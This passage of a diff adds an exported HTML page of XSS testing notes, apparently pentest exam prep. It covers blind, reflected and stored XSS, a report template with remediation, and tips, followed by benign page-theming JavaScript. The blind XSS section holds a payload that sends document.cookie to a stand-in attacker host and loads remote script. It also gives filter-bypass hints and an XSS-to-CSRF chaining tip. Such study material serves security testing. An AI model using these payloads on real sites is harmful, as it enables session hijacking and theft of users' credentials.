+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Use browser DevTools &#8594; Sources &#8594; search for sources being passed to sinks
+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Search for: innerHTML, document.write, eval, location.href</span>
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org111ed04" class="outline-2">
+<h2 id="org111ed04">7. Blind XSS</h2>
+<div class="outline-text-2" id="text-org111ed04">
+<p>
+Payload stored and executed in a context you cannot directly
+observe — admin panel, log viewer, support ticket system.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_9016f4b5682f45589d43c1bb50f9f042>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_9016f4b5682f45589d43c1bb50f9f042=document.querySelector('button[name=btn_9016f4b5682f45589d43c1bb50f9f042]');
+copyBtnbtn_9016f4b5682f45589d43c1bb50f9f042.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Use a callback to confirm execution -->\n<script src=\"https://$ATTACKER/xss.js\"></script>\n<img src=x onerror=\"fetch('https://$ATTACKER/blind?'+document.cookie)\">\n\n<!-- XSS Hunter — dedicated blind XSS platform -->\n<!-- Generates payload, notifies you when it fires with screenshot + cookies -->\n`);copyBtnbtn_9016f4b5682f45589d43c1bb50f9f042.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9016f4b5682f45589d43c1bb50f9f042.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-html"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Use a callback to confirm execution</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">src</span>=<span style="color: var(--clr-string); background-color: var(--bg-string);">"https://$ATTACKER/xss.js"</span>&gt;&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x <span style="color: var(--clr-variable); background-color: var(--bg-variable);">onerror</span>=<span style="color: var(--clr-string); background-color: var(--bg-string);">"fetch('https://$ATTACKER/blind?'+document.cookie)"</span>&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">XSS Hunter &#8212; dedicated blind XSS platform</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Generates payload, notifies you when it fires with screenshot + cookies</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org07197b9" class="outline-2">
+<h2 id="org07197b9">8. Stored vs Reflected — Testing Approach</h2>
+<div class="outline-text-2" id="text-org07197b9">
+</div>
+<div id="outline-container-org1e7e8b1" class="outline-3">
+<h3 id="org1e7e8b1">Reflected</h3>
+<div class="outline-text-3" id="text-org1e7e8b1">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_473644502cd84215a77b2635ae773620>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_473644502cd84215a77b2635ae773620=document.querySelector('button[name=btn_473644502cd84215a77b2635ae773620]');
+copyBtnbtn_473644502cd84215a77b2635ae773620.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject in URL parameter — test in browser\nhttps://target.com/search?q=<script>alert(1)</script>\n\n# Or via curl — look for unescaped payload in response\ncurl -s \"https://target.com/search?q=<script>alert(1)</script>\" | grep -i \"script\"\n`);copyBtnbtn_473644502cd84215a77b2635ae773620.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_473644502cd84215a77b2635ae773620.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Inject in URL parameter &#8212; test in browser
+</span>https://target.com/search?<span style="color: var(--clr-variable); background-color: var(--bg-variable);">q</span>=&lt;script&gt;alert(1)&lt;/script&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Or via curl &#8212; look for unescaped payload in response
+</span>curl -s <span style="color: var(--clr-string); background-color: var(--bg-string);">"https://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"</span> | grep -i <span style="color: var(--clr-string); background-color: var(--bg-string);">"script"</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgf0534ec" class="outline-3">
+<h3 id="orgf0534ec">Stored</h3>
+<div class="outline-text-3" id="text-orgf0534ec">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_c333bea4d1e145069afc70682a78a8fb>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_c333bea4d1e145069afc70682a78a8fb=document.querySelector('button[name=btn_c333bea4d1e145069afc70682a78a8fb]');
+copyBtnbtn_c333bea4d1e145069afc70682a78a8fb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Submit payload in any stored input: comment, profile, name, bio\n2. Navigate to where that input is rendered\n3. Check if payload executes\n4. Test inputs rendered for OTHER users — highest impact\n   (admin panels, public profiles, comment sections)\n`);copyBtnbtn_c333bea4d1e145069afc70682a78a8fb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c333bea4d1e145069afc70682a78a8fb.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">1. Submit payload in any stored input: comment, profile, name, bio
+2. Navigate to where that input is rendered
+3. Check if payload executes
+4. Test inputs rendered for OTHER users &#8212; highest impact
+   (admin panels, public profiles, comment sections)
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgaf279ec" class="outline-2">
+<h2 id="orgaf279ec">9. Reporting Template</h2>
+<div class="outline-text-2" id="text-orgaf279ec">
+<p>
+<b>Classification:</b> Cross-Site Scripting (XSS) — Reflected / Stored / DOM
+</p>
+
+<p>
+<b>Severity:</b> High (Stored — executes for all users) /
+             Medium (Reflected — requires victim to click link)
+</p>
+
+<p>
+<b>Description:</b>
+The <code>[parameter]</code> at <code>[endpoint]</code> reflects/stores user-supplied
+input in the page without sanitisation. An attacker can inject
+arbitrary JavaScript that executes in the victim's browser under
+the application's origin, enabling session hijacking, credential
+theft, and actions on behalf of the victim.
+</p>
+
+<p>
+<b>Evidence:</b>
+</p>
+<pre class="example" id="orgbd17209">
+GET /search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt; HTTP/1.1
+
+HTTP/1.1 200 OK
+...
+&lt;div class="results"&gt;
+  &lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;/div&gt;
+</pre>
+
+<p>
+<b>Remediation:</b>
+</p>
+<ul class="org-ul">
+<li>Encode output contextually before rendering in HTML, attributes,
+or JavaScript</li>
+<li>Implement Content-Security-Policy to restrict script execution</li>
+<li>Validate and sanitise input server-side — do not rely on
+client-side validation alone</li>
+<li>Set <code>HttpOnly</code> on session cookies to prevent theft via XSS</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-orge1209d1" class="outline-2">
+<h2 id="orge1209d1">Tips</h2>
+<div class="outline-text-2" id="text-orge1209d1">
+<ul class="org-ul">
+<li>Always check where the input lands in the source before picking
+a payload — wrong context = no execution</li>
+<li><code>alert(document.domain)</code> is better than <code>alert(1)</code> for reports
+— proves execution in the target origin, not just popup</li>
+<li>Stored XSS in an admin panel is effectively privilege escalation
+— if you can trigger JS in an admin context, note it as Critical</li>
+<li>DOM XSS via the URL hash is never sent to the server and will
+not appear in server logs — often missed by WAFs</li>
+<li>XSS + CSRF token exfiltration chains are a common exam finding
+pattern — if you have XSS on a CSRF-protected form, combine them</li>
+<li>If <code>alert</code> is filtered try <code>confirm(1)</code> or <code>prompt(1)</code> — different
+function names, same effect for PoC purposes</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
+  // Remove invisible textarea
+  document.body.removeChild(textArea);
+
+  return res;
+}
+
+// Handle the default header / footer drawers
+const header = document.getElementById("generated-header");
+const footer = document.getElementById("generated-footer");
+
+if (header) {
+  let toggle = header.querySelector("header nav input.nav-toggle");
+  if (toggle) { toggle.checked = false; }
+}
+if (footer) {
+  let nav = footer.querySelector("nav");
+  let toggle = nav && nav.querySelector(".nav-toggle");
+  let navList = nav && nav.querySelector(".nav-list");
+  let navElem = navList && [...navList.querySelectorAll(".nav-item")];
+  let numLink = navElem && navElem.length;
+  if (numLink) {
+    toggle.checked = false;
+    toggle.addEventListener('change', () => {
+      if (toggle.checked) {
+	setTimeout(() => window.scrollTo({
+	  behavior: 'smooth',
+	  top: document.body.scrollHeight	  
+	}), 88);
+      }
+   });
+  }
+}
+
+function autoCompact() {
+  var anchor, links, overlap, trivial;
+  const domCompute = (node) => {
+    if (node) {
+      anchor = node.querySelector('.nav-title, .nav-author');
+      links = node.querySelector('.nav-list');
+      overlap = links.offsetLeft - 5 <= anchor.offsetLeft + anchor.offsetWidth;	
+      trivial = links.offsetLeft === anchor.offsetLeft;
+    }
+  };
+  let mediaMatch = window.matchMedia('(max-width: 768px)').matches;
+  [header, footer].forEach(e => {
+    if (e) {
+      if (mediaMatch) {
+	e.classList.add('compact');
+      } else {
+	domCompute(e);
+	if (overlap && !trivial) {
+	  e.classList.add('compact');
+	} else {	
+	  let clone = e.cloneNode(true);
+	  clone.style.top = '-2000px';
+	  clone.style.maxHeight = '0px';
+	  clone.classList.remove('compact');
+	  e.parentNode.insertBefore(clone, e);
+	  domCompute(clone);
+	  let toggle = e.querySelector('.nav-toggle');
+	  if (!overlap && toggle && !toggle.checked) {
+	    e.classList.remove('compact');
+	  }
+	  e.parentNode.removeChild(clone);
+	}
+      }
+    }
+  })
+}
+
+if ((header || footer)) {
+  if (options.hasOwnProperty('layout')) {
+    [header, footer].forEach(e => e ? e.classList.add(options.layout) : null);
+  } else {
+    autoCompact();
+    window.addEventListener('resize', autoCompact);
+  }
+}
+
+if (options.hasOwnProperty('src-lang') && options['src-lang'] == 't') {
+  let labels = [...document.querySelectorAll('.srcLangLabel')];
+  labels.forEach(l => l.style.display = 'inline-block');
+}
+
+if (options.hasOwnProperty('collapsing') && options.collapsing == 't') {
+  let levels = [2, 3, 4, 5, 6];
+  let containerPrefix = 'outline-container-';
+  levels.forEach(l => {
+    let containers = [...document.querySelectorAll(`.outline-${l}`)];
+    containers.forEach(c => {
+      let id = c.id.slice(containerPrefix.length);
+      let headline = document.getElementById(id);
+      let siblings = [...c.children].filter(child => child.id != id);
+      headline.classList.add('collapsible');
+      headline.addEventListener('click', () => {	
+	if (headline.classList.contains('collapsed')) {
+	  headline.classList.remove('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.remove('hidden');
+	  });	  
+	} else {
+	  headline.classList.add('collapsed');
+	  siblings.forEach(child => {
+	    child.classList.add('hidden');
+	  });
+	}
+      })
+    })
+  })
+}
+/*]]>*/-->
+</script><div hidden>Generated by: https://github.com/ewantown/nice-org-html</div>
+</div>
+</body>
+</html>
